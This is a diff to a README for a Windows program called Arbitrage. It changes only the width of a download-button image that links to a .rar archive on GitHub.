@@ -4,7 +4,7 @@
 Download the `.rar` file [here](https://github.com/arbitragesoftware/Arbitrage/raw/master/Arbitrage.rar). It includes all dependencies. You must have the [Winrar] Windows XP/Vista/7/8/10 version or above.
 
 <a href="https://github.com/arbitragesoftware/Arbitrage/raw/master/Arbitrage.rar">
-<img src="/download.png" width="100%">
+<img src="/download.png" width="50%">
 </a>
 
 ## What is Arbitrage?
